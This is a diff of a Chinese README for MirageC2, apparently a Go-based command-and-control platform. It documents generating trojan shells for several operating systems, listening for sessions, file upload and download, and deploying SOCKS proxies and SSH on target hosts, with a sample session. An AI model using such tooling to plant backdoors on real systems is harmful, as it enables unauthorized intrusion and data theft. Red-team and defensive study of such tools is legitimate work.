@@ -2,12 +2,15 @@
 一款基于golang开发的C2平台，在后续的开发中，将陆续完善其功能。
 
 # 安装方式
-在服务端，您的PC需要具备[golang](https://go.dev)的运行环境，用于生成木马。
+1. 在服务端，您的PC需要具备[golang](https://go.dev)的运行环境，用于生成木马。
+2. 安装完毕后，运行run.bat或者run.sh会自动帮您安装服务端所需的库环境。
 
 # 使用方式
+本程序中使用到的所有的模块，例如创建后门、创建ssh、创建socks等都在您的电脑上进行，所以第一次运行这些指令的时候需要花上一定的时间，请耐心等待。
+
 1. 运行可执行程序打开MirageC2服务器端。
 ```
-> help:		输出帮助信息。
+> help:	输出帮助信息。
 > create: 	通过Create参数来生成指定的Shell。例子: create <windows/linux/darwin> <C2IP:C2Port> <Save Path>
             [!] 注意如果使用create功能，您必须保证Server端拥有golang的运行环境。
 > kill:		杀死指定的job或者session。例子：kill job <id>
@@ -15,7 +18,20 @@
 > show: 	[jobs,sessions]查看侦听的端口以及能够命令控制的会话。例如：show sessions
 > session:	进入到指定会话中进行命令执行。例子: session <id>
 ```
-2. 使用案例
+
+2. Session会话中支持的指令。
+```
+> help:        输出帮助信息。
+> show:        查看当前session中命令执行的列表。
+> upload:      上传文件至目标服务器，例子：upload <LocalPath> <RemotePath>
+> download:    下载目标服务器文件至本地，例子：download <RemotePath> <LocalPath>
+> socks:       1. 部署代理功能，例子：socks <ReverseServerIP> <ServerPort> <ForwardPort>
+               2. 控制目标主机连接代理服务器，例子：socks connect <ReverseServerIP>:<ServerPort>
+> ssh:         1. 部署SSH功能，例子：ssh install
+               2. 连接目标主机的SSH：ssh connect <SSHServerIP>
+```
+
+3. 使用案例
 ```
 Mirage Control > listen 127.0.0.1:8888
 [+] Jobs Set: listen ip 127.0.0.1:8888
@@ -37,8 +53,7 @@ Mirage Control -> Session1 > whoami
 [-+] Result: --------------- 
 deepmountains
 [-+] Result: ---------------
-Mirage Control -> Session1 > exit
-[*] Sessions 1 将被挂起
+Mirage Control -> Session1 > 
 ```
 
 # 免责声明
